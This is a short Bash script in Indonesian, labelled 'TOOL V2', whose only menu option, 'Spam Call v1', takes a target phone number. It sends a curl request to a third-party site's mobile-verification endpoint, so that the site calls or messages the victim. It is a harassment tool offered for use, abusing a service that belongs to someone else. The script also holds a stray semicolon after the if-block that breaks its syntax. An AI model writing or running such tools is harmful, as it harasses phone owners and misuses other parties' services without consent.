#!/bin/bash

clear

figlet TOOL V2 | lolcat
echo '
[1]. Spam Call v1
[0]. Keluar aja !!!
'
echo
read -p "Masukan Pilihan Anda : " pil
if [[ $pil == 1 ]]; then
read -p "Masukan no Target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
sleep 1
echo "Selesai"
exit
fi
;
echo